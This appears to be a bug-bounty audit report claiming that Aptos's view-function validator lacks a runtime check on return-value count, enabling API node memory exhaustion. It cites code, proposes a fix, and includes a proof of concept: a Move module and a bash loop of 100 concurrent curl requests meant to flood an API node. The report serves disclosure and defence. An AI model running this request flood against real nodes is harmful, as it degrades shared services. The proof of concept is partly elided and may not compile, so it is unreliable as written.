# Audit Report

## Title
View Function Return Value Count Validation Gap Enabling API Node Memory Exhaustion

## Summary
The `validate_view_function()` function does not validate the number of return values at execution time, relying solely on publishing-time bytecode verification. This creates a defense-in-depth gap that can be exploited to cause API node memory exhaustion, particularly for modules published under different feature flag configurations or through concurrent request amplification. [1](#0-0) 

## Finding Description

The `validate_view_function()` performs only a non-empty check on return types, not a count validation. While the Move bytecode verifier enforces `max_function_return_values` during module publishing, this limit is configuration-dependent and not re-validated at view function execution time. [2](#0-1) 

The bytecode verifier limit is conditionally applied: [3](#0-2) 

When `ENABLE_FUNCTION_VALUES` is disabled, `max_function_return_values` is `None` (unlimited). Even with the feature enabled (default: 128 limit), a view function can return 128 large values. 

The execution flow allocates memory for all return values before gas limits are checked: [4](#0-3) 

The return values are collected into memory (`Vec<Vec<u8>>`) and returned via the API: [5](#0-4) 

**Attack Scenario:**
1. Attacker deploys a module with a view function returning 128 large vectors (e.g., `vector<u8>` with 15KB each)
2. Attacker makes concurrent API calls to this view function
3. Each call allocates ~2MB of return value memory (128 Ã— 15KB)
4. 100 concurrent requests = 200MB memory consumption
5. API node experiences memory pressure and potential DoS

## Impact Explanation

This is a **Medium severity** vulnerability per Aptos bug bounty criteria:
- **API node resource exhaustion**: Can cause API service degradation or crashes
- **No consensus impact**: View functions are read-only and don't affect blockchain state
- **Limited scope**: Affects API nodes, not validator consensus nodes (unless they also serve API traffic)
- **Amplification via concurrency**: Realistic attack vector requiring only API access

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." While gas limits exist, they may not prevent memory exhaustion before timeout, especially under concurrent load.

## Likelihood Explanation

**High likelihood** of occurrence:
- View functions are publicly callable via API without authentication
- Modules can be deployed by any account with sufficient gas fees
- Even with the 128 return value limit, each value can be arbitrarily large (limited only by gas)
- No special privileges or validator access required
- Concurrent API calls amplify the attack

The gas limit of 2,000,000 units provides some protection, but the relationship between gas cost and memory allocation may not be tight enough to prevent exhaustion under concurrent load. [6](#0-5) 

## Recommendation

Add an explicit return value count check in `validate_view_function()` with a conservative limit appropriate for API execution contexts (e.g., 32 or 64), independent of the bytecode verifier limit:

```rust
// In validate_view_function():
const MAX_VIEW_FUNCTION_RETURN_VALUES: usize = 32;

if func.return_tys().len() > MAX_VIEW_FUNCTION_RETURN_VALUES {
    return Err(
        PartialVMError::new(StatusCode::INVALID_MAIN_FUNCTION_SIGNATURE)
            .with_message(format!(
                "view function returns too many values: {} (max: {})",
                func.return_tys().len(),
                MAX_VIEW_FUNCTION_RETURN_VALUES
            )),
    );
}
```

Additionally, consider implementing per-client rate limiting and total memory budgets for view function execution at the API layer.

## Proof of Concept

```move
// malicious_module.move
module attacker::memory_exhauster {
    use std::vector;

    #[view]
    public fun exhaust_memory(): (
        vector<u8>, vector<u8>, vector<u8>, vector<u8>,
        vector<u8>, vector<u8>, vector<u8>, vector<u8>,
        // ... repeat 128 times
        vector<u8>, vector<u8>, vector<u8>, vector<u8>
    ) {
        let large_vec = vector::empty<u8>();
        let i = 0;
        while (i < 15000) {
            vector::push_back(&mut large_vec, 0xFF);
            i = i + 1;
        };
        
        // Return 128 copies of the large vector
        (
            large_vec, large_vec, large_vec, large_vec,
            // ... repeat to create 128 return values totaling ~2MB
        )
    }
}
```

**Exploitation:**
```bash
# Deploy the module
aptos move publish --package-dir malicious_module

# Make concurrent API calls
for i in {1..100}; do
  curl -X POST "http://api-node:8080/v1/view" \
    -H "Content-Type: application/json" \
    -d '{
      "function": "0xattacker::memory_exhauster::exhaust_memory",
      "type_arguments": [],
      "arguments": []
    }' &
done

# Monitor API node memory consumption
# Expected: ~200MB additional memory used, potential service degradation
```

## Notes

The vulnerability exists due to a defense-in-depth gap. While bytecode verification enforces limits at publishing time, runtime validation should provide an additional safety layer, especially for API-facing functionality with different resource constraints than consensus execution. The current implementation trusts historical verification decisions without accounting for configuration changes or concurrent request amplification scenarios.

### Citations

**File:** aptos-move/aptos-vm/src/verifier/view_function.rs (L55-61)
```rust
    // Must return values.
    if func.return_tys().is_empty() {
        return Err(
            PartialVMError::new(StatusCode::INVALID_MAIN_FUNCTION_SIGNATURE)
                .with_message("view function must return values".to_string()),
        );
    }
```

**File:** third_party/move/move-bytecode-verifier/src/limits.rs (L85-90)
```rust
            if let Some(limit) = config.max_function_return_values {
                if self.resolver.signature_at(function_handle.return_).0.len() > limit {
                    return Err(PartialVMError::new(StatusCode::TOO_MANY_PARAMETERS)
                        .at_index(IndexKind::FunctionHandle, idx as u16));
                }
            };
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L183-187)
```rust
        max_function_return_values: if enable_function_values {
            Some(128)
        } else {
            None
        },
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L2775-2789)
```rust
            let result = session.execute_loaded_function(
                func,
                arguments,
                gas_meter,
                traversal_context,
                &loader,
                // No need to record any traces for view functions.
                &mut NoOpTraceRecorder,
            )?;

            Ok(result
                .return_values
                .into_iter()
                .map(|(bytes, _ty)| bytes)
                .collect::<Vec<_>>())
```

**File:** api/src/view_function.rs (L154-161)
```rust
    let output = AptosVM::execute_view_function(
        &state_view,
        view_function.module.clone(),
        view_function.function.clone(),
        view_function.ty_args.clone(),
        view_function.args.clone(),
        context.node_config.api.max_gas_view_function,
    );
```

**File:** config/src/config/api_config.rs (L102-102)
```rust
const DEFAULT_MAX_VIEW_GAS: u64 = 2_000_000; // We keep this value the same as the max number of gas allowed for one single transaction defined in aptos-gas.
```
